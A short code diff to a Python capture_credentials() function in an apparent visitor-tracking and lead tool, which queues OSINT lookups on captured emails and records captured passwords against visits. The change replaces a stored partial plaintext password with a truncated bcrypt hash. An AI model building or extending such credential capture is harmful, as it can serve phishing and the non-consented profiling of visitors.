@@ -103,13 +103,16 @@ def capture_credentials():
                     log_queue.put({'type': 'osint', 'email': email})
                     log_queue.put({'type': 'ai_auto_tag', 'lead_id': lead.id if lead else None})
                 
-                # Save password to visit notes (for security auditing)
+                # Hash password before storage (SECURITY FIX)
                 if password:
+                    import bcrypt
                     import json
-                    # Store in custom JSON field if exists, or create note
+                    # Hash the password before storing
+                    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
+                    # Store hash in custom JSON field
                     if hasattr(visit, 'detected_sessions'):
                         sessions = json.loads(visit.detected_sessions or '[]')
-                        sessions.append({'type': 'password_captured', 'value': password[:3] + '***'})
+                        sessions.append({'type': 'password_captured', 'hash': password_hash[:20] + '...'})
                         visit.detected_sessions = json.dumps(sessions)
                 
                 db.session.commit()
